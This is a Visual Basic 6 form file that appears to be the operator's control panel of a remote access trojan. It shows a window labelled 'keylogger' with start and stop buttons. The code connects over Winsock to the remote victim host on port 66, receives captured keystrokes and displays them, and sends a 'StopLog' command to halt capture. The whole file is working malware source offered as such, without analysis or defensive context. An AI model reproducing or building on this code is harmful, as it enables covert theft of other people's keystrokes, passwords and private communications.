VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmKeyLog 
   BackColor       =   &H00000000&
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   4080
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   5895
   LinkTopic       =   "Form1"
   ScaleHeight     =   4080
   ScaleWidth      =   5895
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock KeyLog 
      Left            =   5280
      Top             =   480
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.TextBox listen 
      BackColor       =   &H00800000&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000005&
      Height          =   2775
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   360
      Width           =   5655
   End
   Begin VB.Label lblstoplog 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "stop logging"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   4110
      TabIndex        =   4
      Top             =   3510
      Width           =   1365
   End
   Begin VB.Shape Shape1 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   4080
      Top             =   3480
      Width           =   1425
   End
   Begin VB.Label lblstartlog 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      Caption         =   "start logging"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   240
      Left            =   390
      TabIndex        =   3
      Top             =   3510
      Width           =   1365
   End
   Begin VB.Shape Shape11 
      BorderColor     =   &H00FF8080&
      Height          =   300
      Left            =   360
      Top             =   3480
      Width           =   1425
   End
   Begin VB.Label cmdX 
      Alignment       =   2  'Center
      BackColor       =   &H00FF8080&
      Caption         =   "X"
      BeginProperty Font 
         Name            =   "OCR A Extended"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   195
      Left            =   5640
      TabIndex        =   0
      ToolTipText     =   "Close"
      Top             =   15
      Width           =   240
   End
   Begin VB.Label title 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H00FF8080&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "keylogger"
      BeginProperty Font 
         Name            =   "OCR A Extended"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   225
      Left            =   0
      TabIndex        =   1
      Top             =   0
      Width           =   5895
   End
End
Attribute VB_Name = "frmKeyLog"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim FirstX, FirstY As Integer

Private Sub cmdX_Click()
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.WS.SendData "StopLog"
End If
Unload Me
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartlog.BackColor = &H8
lblstoplog.BackColor = &H8
End Sub

Private Sub keylog_DataArrival(ByVal bytesTotal As Long)
Dim gData As String ' IMPORTANT: has to be dimmed
           KeyLog.GetData gData
    If InStr(1, gData, "KEY") Then      ' KEY: gData = pressed key
        listen.Text = listen.Text + ParseStr(gData, "KEY")
    End If
End Sub

Private Sub lblstartlog_Click()
On Error Resume Next
If KeyLog.State = 7 Then
Exit Sub
End If
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
With KeyLog
.Close
.Connect frmMain.WS.RemoteHost, 66
End With
End If
End Sub

Private Sub lblstoplog_Click()
On Error Resume Next
If frmMain.WS.State = 0 Then
frmMain.Status.Caption = "you're not connected!..."
Else
frmMain.WS.SendData "StopLog"
End If
End Sub

Private Sub lblstartlog_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartlog.BackColor = &HFFC0C0
End Sub

Private Sub lblstartlog_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstartlog.BackColor = &H800000
End Sub

Private Sub lblstoplog_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstoplog.BackColor = &HFFC0C0
End Sub

Private Sub lblstoplog_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
lblstoplog.BackColor = &H800000
End Sub

Private Sub title_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    FirstX = X
    FirstY = Y
End If
End Sub

Private Sub title_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = vbLeftButton Then
    Me.Left = Me.Left + (X - FirstX)
    Me.Top = Me.Top + (Y - FirstY)
End If
End Sub
